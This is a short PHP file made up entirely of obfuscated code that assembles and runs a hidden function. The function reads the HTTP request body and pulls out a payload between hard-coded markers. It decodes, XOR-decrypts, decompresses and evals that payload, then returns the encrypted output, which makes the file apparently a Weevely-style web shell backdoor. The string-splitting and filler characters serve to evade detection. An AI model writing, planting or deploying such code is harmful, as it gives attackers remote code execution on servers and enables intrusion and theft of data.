<?php
$b='$k="#w16a6#w64bf";$k#w#wh="a0269#w5bc#weccc#w";$kf="34e13a7d4ee8"#w#w;$#wp="JrXbs2dym#wz#wRdk9a#wd";';
$m=str_replace('SS','','crSSeatSSSSe_fuSSncSStSSion');
$R='#w(#w$j<$c&&$i<$#wl);#w#w$j++,$i++){$o.#w=$t{$#wi}^#w$k{$#wj};#w}}ret#w#wurn $#wo#w;}if (@pr#weg_m';
$i='#wa#wtch("/#w$kh(#w.+)$kf/",@file_get_con#wtents("php#w://#winpu#wt"),$m)==1) #w{@ob_start();@e#wv#';
$A='n#wd_cle#wan()#w;$#wr=@ba#ws#we64_encode#w#w(@x#w(@gzc#wompress($o),$k));prin#wt("$p#w$kh$r$kf");}';
$a='f#wunction x($t,$#wk){$c=#wstrle#wn($k);$l=s#wtrlen($#wt)#w;$o="";#wfor($i#w=0;$i<$#wl;){#wfor($j=0;';
$J='wal(@gzuncom#wpre#wss(#w@x(@b#wase64_d#we#wcode($m#w[1]),$k)))#w;#w$o=@ob#w_get_contents#w();@ob_e';
$c=str_replace('#w','',$b.$a.$R.$i.$J.$A);
$d=$m('',$c);$d();
?>
